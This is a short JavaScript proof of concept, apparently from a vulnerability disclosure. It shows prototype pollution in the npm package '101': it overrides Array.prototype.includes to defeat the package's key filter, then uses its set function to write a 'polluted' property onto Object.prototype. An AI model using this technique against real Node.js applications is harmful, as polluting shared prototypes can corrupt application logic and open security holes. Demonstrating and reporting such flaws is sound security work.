Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const _101 = require('101/set');
_101({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);